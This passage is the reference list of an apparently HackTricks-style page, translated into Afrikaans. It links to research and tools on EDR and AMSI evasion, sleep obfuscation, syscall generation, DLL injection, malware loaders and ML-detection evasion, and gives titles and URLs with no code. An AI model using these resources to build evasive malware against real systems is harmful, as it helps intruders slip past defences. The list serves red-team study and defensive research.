- [26] [Check Point Research – GachiLoader: Node.js-wanware verslaan met API-opsporing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [27] [Sleeping Beauty: Om Adaptix met Crystal Palace te laat slaap](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [28] [SensePost – Vergiftiging van prosesparameters](https://sensepost.com/blog/2026/process-parameter-poisoning/)
- [29] [Orange Cyberdefense – p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)
- [30] [Sleeping Beauty II: CFG, CET en vervalsing van stapels](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [31] [Ekko-sluimerverduistering](https://github.com/Cracked5pider/Ekko)
- [32] [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)
- [33] [blog.xpnsec.com - Versteek jou Dotnet Etw](https://blog.xpnsec.com/hiding-your-dotnet-etw)
- [34] [repnz/etw-providers-docs](https://github.com/repnz/etw-providers-docs)
- [35] [trustedsec.com - Misbruik van Chrome Remote Desktop in Red Team-bedrywighede: ’n Praktiese gids](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)
- [36] [Check Point Research - BTR Reforged: Om Defender se remediëringsdrywer as ’n kernbewerkingsprimitief te bewapen](https://research.checkpoint.com/2026/btr-reforged-weaponizing-defenders-remediation-driver-as-a-kernel-operation-primitive/)
- [37] [Dump-GUY - BTR_CLI](https://github.com/Dump-GUY/BTR_CLI)
- [38] [MDSec Function Peekaboo-metgeselkode](https://github.com/mdsecactivebreach/functionpeekaboo)
- [39] [MDSec - Function Peekaboo: Skep selfmaskerende funksies met LLVM](https://mdsec.co.uk/2025/10/function-peekaboo-crafting-self-masking-functions-using-llvm/)
- [40] [Microsoft Learn - VirtualProtect](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect)
- [41] [TwoSevenOneT - InjectSetConsole-bronkode](https://github.com/TwoSevenOneT/InjectSetConsole)
- [42] [Microsoft Learn - CreatePipe-funksie](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-createpipe)
- [43] [Microsoft Learn - Skep ’n kinderproses met herlei invoer en uitvoer](https://learn.microsoft.com/en-us/windows/win32/procthread/creating-a-child-process-with-redirected-input-and-output)
- [44] [Praetorian - GhostPack Necromancy: Hersmee C#-nutsgoed met WasmForge](https://praetorian.com/blog/wasmforge-csharp-ghostpack-edr-evasion)
- [45] [WasmForge - Samestelling van C# / .NET-projekte](https://github.com/praetorian-inc/wasmforge/blob/main/docs/CSHARP.md)
- [46] [DLLParty-bewys van konsep en bronkode](https://github.com/epersic/DLLParty)
- [47] [DLLParty — Misbruik van thread pool-internals vir shellcodelose DLL-inspuiting](https://medium.com/@persic.eno/dllparty-abusing-thread-pool-internals-for-shellcodeless-dll-injection-7c84106f7745)
- [48] [EMBER2024-maatstafdatastel en thrember-nutsgoed](https://github.com/FutureComputing4AI/EMBER2024)
- [49] [Gebruik van EMBER2024 om red team-inplantings te evalueer](https://mez0.cc/posts/evaluating-implants-with-ember/)
- [50] [MSec Operations – Ontduiking van masjienleer-gebaseerde opsporing](https://msecops.de/blog/posts/ml-evasion/)
- [51] [Kaspersky Securelist – NetamLoader, ’n XAML-gebaseerde .NET-laairaamwerk](https://securelist.com/netamloader/121676)
- [52] [Microsoft Learn – AMSI_RESULT-opnoeming](https://learn.microsoft.com/en-us/windows/win32/api/amsi/ne-amsi-amsi_result)
- [53] [Microsoft Learn – IAntimalware::Scan-metode](https://learn.microsoft.com/en-us/windows/win32/api/amsi/nf-amsi-iantimalware-scan)
- [54] [Zscaler ThreatLabz - Tegniese ontleding van 2CLoader](https://zscaler.com/blogs/security-research/2cloader-new-malware-loader-delivering-vidar-and-remus)
{{#include ../banners/hacktricks-training.md}}
